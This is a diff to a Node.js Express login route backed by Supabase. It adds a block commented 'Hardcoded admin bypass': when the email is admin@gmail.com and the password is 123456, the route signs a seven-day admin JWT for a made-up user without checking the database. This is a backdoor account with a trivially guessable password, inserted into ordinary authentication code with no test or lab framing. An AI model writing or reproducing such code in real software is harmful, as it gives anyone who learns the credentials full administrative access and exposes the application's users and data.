@@ -34,6 +34,19 @@ router.post('/login', async (req, res, next) => {
         const { email, password } = req.body;
         if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
 
+        // Hardcoded admin bypass
+        if (email === 'admin@gmail.com' && password === '123456') {
+            const adminUser = {
+                id: 'hardcoded-admin-id',
+                name: 'Super Admin',
+                email: 'admin@gmail.com',
+                role: 'admin',
+                created_at: new Date().toISOString()
+            };
+            const token = jwt.sign({ id: adminUser.id, email: adminUser.email, role: adminUser.role }, process.env.JWT_SECRET, { expiresIn: '7d' });
+            return res.json({ token, user: adminUser });
+        }
+
         const { data: user, error } = await supabase
             .from('users')
             .select('*')
